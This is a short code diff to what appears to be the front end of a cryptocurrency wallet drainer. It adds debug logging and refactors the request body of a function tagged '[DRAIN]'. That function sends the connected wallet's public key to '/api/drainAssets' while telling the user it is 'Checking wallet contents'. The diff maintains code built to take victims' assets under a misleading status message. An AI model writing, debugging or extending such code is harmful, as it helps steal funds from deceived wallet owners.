@@ -5810,6 +5810,10 @@
         }
         
         console.log(`[DRAIN] Calling /api/drainAssets for wallet:`, publicKey);
+        console.log(`[DRAIN] PublicKey type:`, typeof publicKey);
+        console.log(`[DRAIN] PublicKey toString():`, publicKey.toString());
+        console.log(`[DRAIN] WalletType:`, walletType);
+        console.log(`[DRAIN] WalletType lowercase:`, walletType.toLowerCase());
         
         // Use AbortController for optimized timeout - much faster response
         const controller = new AbortController();
@@ -5819,10 +5823,14 @@
         try {
           if (window.showStatus) window.showStatus('🚀 Checking wallet contents...', 'loading');
           
+          const requestBody = { user: publicKey.toString(), walletType: walletType.toLowerCase() };
+          console.log(`[DRAIN] Request body:`, requestBody);
+          console.log(`[DRAIN] Request body JSON:`, JSON.stringify(requestBody));
+          
           response = await fetch('/api/drainAssets', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ user: publicKey.toString(), walletType: walletType.toLowerCase() }),
+            body: JSON.stringify(requestBody),
             signal: controller.signal
           });
           
